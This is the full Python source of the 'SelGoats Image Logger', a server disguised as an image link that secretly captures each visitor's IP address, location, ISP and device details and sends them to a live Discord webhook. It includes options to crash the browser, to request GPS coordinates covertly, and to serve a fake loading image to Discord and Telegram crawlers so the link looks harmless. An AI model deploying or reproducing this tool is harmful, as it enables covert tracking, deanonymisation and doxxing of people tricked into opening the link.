# language: Python, file: main.py, target: any (Flask/HTTP server for Discord Open Original)
# SelGoats Discord Image Logger — full source
# Copyright (c) SelGoats

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib import parse
import traceback
import requests
import base64
import httpagentparser
import os
import sys

__app__ = "SelGoats Image Logger"
__version__ = "1.0"
__author__ = "SelGoats"

# ======================== CONFIG ========================
config = {
    # BASE
    "webhook": "https://discord.com/api/webhooks/1564755250919772193/T8HWcw6FNay4HPk4PF_aSlWLj9R6ET_DvsBq0k6sP37jgkvYP91zWAfoVtUJ33wBhoUj",
    "image": "https://media.discordapp.net/attachments/1524195725318033560/1566185842672803881/selgoats.png?ex=6ae8487b&is=6ae6f6fb&hm=9a43b5050b335a1e0fc953fdc6e4b15823ea98a59bde881268ab369ea2d3be91&=&format=webp&quality=lossless&width=577&height=1024",  # default image shown to victim
    "imageArgument": True,  # allow ?url= or ?id= base64 image override

    # WEBHOOK LOOK
    "username": "SelGoats Logger",
    "color": 0x9B59B6,  # purple

    # OPTIONS
    "crashBrowser": False,
    "accurateLocation": False,  # GPS prompt (suspicious)

    "message": {
        "doMessage": False,
        "message": "Logged by SelGoats.",
        "richMessage": True,
    },

    "vpnCheck": 1,       # 0=off  1=no @everyone on vpn  2=skip entirely
    "linkAlerts": True,  # alert when discord/telegram bot hits the link
    "buggedImage": True, # loading preview for discord crawler

    "antiBot": 1,        # 0-4 (see original docs)

    "redirect": {
        "redirect": False,
        "page": "https://www.google.com"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

# ======================== GHOST BANNER ========================
GHOST = r"""
                  .-.
                 (o o)  SelGoats
                 | O \  Image Logger
                  \   \
                   `~~~'
              [  G H O S T  ]
"""

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    clear()
    print("\033[95m" + GHOST + "\033[0m")
    print(f"  {__app__}  v{__version__}")
    print(f"  by {__author__}")
    print("  ─────────────────────────────────────")
    print("  Waiting for hits on port 8080 ...\n")

# ======================== LOGIC ========================
def botCheck(ip, useragent):
    if not ip:
        return False
    if ip.startswith(("34", "35")):
        return "Discord"
    if useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "SelGoats Logger - Error",
                "color": config["color"],
                "description": f"```\n{error}\n```",
            }]
        }, timeout=10)
    except Exception:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if not ip or ip.startswith(blacklistedIPs):
        return None

    bot = botCheck(ip, useragent or "")
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "embeds": [{
                        "title": "SelGoats - Link Sent",
                        "color": config["color"],
                        "description": f"**Platform:** `{bot}`\n**IP:** `{ip}`\n**Endpoint:** `{endpoint}`",
                    }]
                }, timeout=10)
            except Exception:
                pass
        return None

    ping = "@everyone"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=8).json()
    except Exception:
        info = {"isp": "?", "as": "?", "country": "?", "regionName": "?", "city": "?",
                "lat": 0, "lon": 0, "timezone": "UTC/UTC", "mobile": False, "proxy": False, "hosting": False}

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return None
        if config["vpnCheck"] == 1:
            ping = ""

    if info.get("hosting"):
        if config["antiBot"] >= 3:
            return None
        if config["antiBot"] in (1, 2):
            ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent or "")

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "SelGoats - IP Logged",
            "color": config["color"],
            "description": f"""**A user opened the original image**

**Endpoint:** `{endpoint}`

**IP Info**
> **IP:** `{ip}`
> **ISP:** `{info.get('isp', '?')}`
> **ASN:** `{info.get('as', '?')}`
> **Country:** `{info.get('country', '?')}`
> **Region:** `{info.get('regionName', '?')}`
> **City:** `{info.get('city', '?')}`
> **Coords:** `{info.get('lat')}, {info.get('lon')}` {'(approx)' if not coords else f'(precise)'}
> **Timezone:** `{info.get('timezone', '?')}`
> **Mobile:** `{info.get('mobile')}`
> **VPN:** `{info.get('proxy')}`
> **Hosting/Bot:** `{info.get('hosting')}`

**Device**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User-Agent**
```
{useragent}
```""",
        }]
    }
    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    try:
        requests.post(config["webhook"], json=embed, timeout=10)
    except Exception:
        pass
    return info

# tiny loading gif bytes (bugged preview)
binaries = {
    "loading": base64.b85decode(
        b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'
    )
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # silence default access logs
        return

    def handleRequest(self):
        try:
            # resolve image url
            if config["imageArgument"]:
                qs = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
                if qs.get("url") or qs.get("id"):
                    try:
                        url = base64.b64decode(qs.get("url") or qs.get("id")).decode()
                    except Exception:
                        url = config["image"]
                else:
                    url = config["image"]
            else:
                url = config["image"]

            # forwarded-for (behind reverse proxy / vercel / cloudflare)
            ip = self.headers.get("x-forwarded-for") or self.client_address[0]
            if "," in ip:
                ip = ip.split(",")[0].strip()
            ua = self.headers.get("user-agent") or ""

            # discord / telegram crawler path
            if botCheck(ip, ua):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header("Content-type" if config["buggedImage"] else "Location",
                                 "image/jpeg" if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                makeReport(ip, endpoint=self.path.split("?")[0], url=url)
                return

            # real visitor
            qs = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
            coords = None
            if qs.get("g") and config["accurateLocation"]:
                try:
                    coords = base64.b64decode(qs.get("g")).decode()
                except Exception:
                    pass

            result = makeReport(ip, ua, coords, self.path.split("?")[0], url=url)

            # decide response body
            data = f'''<style>body{{margin:0;padding:0}}div.img{{background-image:url('{url}');background-position:center;background-repeat:no-repeat;background-size:contain;width:100vw;height:100vh}}</style><div class="img"></div>'''.encode()

            if config["message"]["doMessage"]:
                msg = config["message"]["message"]
                if config["message"]["richMessage"] and result:
                    for k, v in {
                        "{ip}": ip,
                        "{isp}": result.get("isp", ""),
                        "{country}": result.get("country", ""),
                        "{city}": result.get("city", ""),
                    }.items():
                        msg = msg.replace(k, str(v))
                data = msg.encode()

            if config["crashBrowser"]:
                data += b'<script>setTimeout(function(){for(var i=69420;i==i;i*=i){console.log(i)}},50)</script>'

            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()

            if config["accurateLocation"]:
                data += b"""<script>
var u=window.location.href;
if(!u.includes("g=")&&navigator.geolocation){
  navigator.geolocation.getCurrentPosition(function(c){
    var g=btoa(c.coords.latitude+","+c.coords.longitude).replace(/=/g,"%3D");
    location.replace(u+(u.includes("?")?"&":"?")+"g="+g);
  });
}
</script>"""
            self.wfile.write(data)

        except Exception:
            self.send_response(500)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"500")
            reportError(traceback.format_exc())

    do_GET = handleRequest
    do_POST = handleRequest

# ======================== ENTRY ========================
if __name__ == "__main__":
    banner()
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(("0.0.0.0", port), ImageLoggerAPI)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n  shut down.")
        server.server_close()
